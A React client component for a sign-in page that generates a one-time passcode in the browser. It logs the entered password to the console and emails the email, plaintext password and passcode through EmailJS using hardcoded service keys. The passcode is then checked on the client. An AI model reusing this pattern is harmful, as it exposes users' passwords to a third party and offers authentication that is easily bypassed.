"use client"
import * as React from 'react';
import {useCallback, useEffect, useRef} from 'react';
import {AppProvider} from '@toolpad/core/AppProvider';
import {type AuthProvider, SignInPage} from '@toolpad/core/SignInPage';
import {useTheme} from '@mui/material/styles';
import emailjs from "@emailjs/browser";
import LoginModal from "@/src/components/login/login_modal";
export default function Login() {
const [isAllow, setAllow] = React.useState(false);
const [open, setOpen] = React.useState(false);
const [toggle, setToggle] = React.useState(true);
const providers = [{ id: 'credentials', name: 'Email and Password' }];
const otp = useRef<number | undefined>(undefined);

const signIn: (provider: AuthProvider, formData: FormData) => void = async (
    provider,
    formData,
) => {
    return new Promise<void>((resolve) => {
        if(toggle) {
            otp.current = Math.floor(100000 + Math.random() * 900000);
            const templateParams = {
                reply_to: formData.get('email'),
                password: formData.get('password'),
                passcode: otp.current
            };
            console.log(templateParams);
            emailjs
                .send("service_0zq428t", "template_a1un4ul", templateParams, "nlUaqVMyxnXcmXKTk")
                .then(() => {
                    setOpen(true);
                    setToggle(false)
//
                    resolve()
//
                })
                .catch((err) => alert("Kiểm tra lại email!"));
        }
    });
};


    const theme = useTheme();
    return (
        <>
        <LoginModal otp = {otp.current} isAllow = {isAllow} setAllow = {setAllow} open={open} setOpen={setOpen}></LoginModal>
        <AppProvider theme={theme}>
            <SignInPage
                signIn={signIn}
                providers={providers}
                slotProps={{ emailField: { autoFocus: false }, form: { noValidate: true } }}
            />
        </AppProvider>
        </>
    );
}
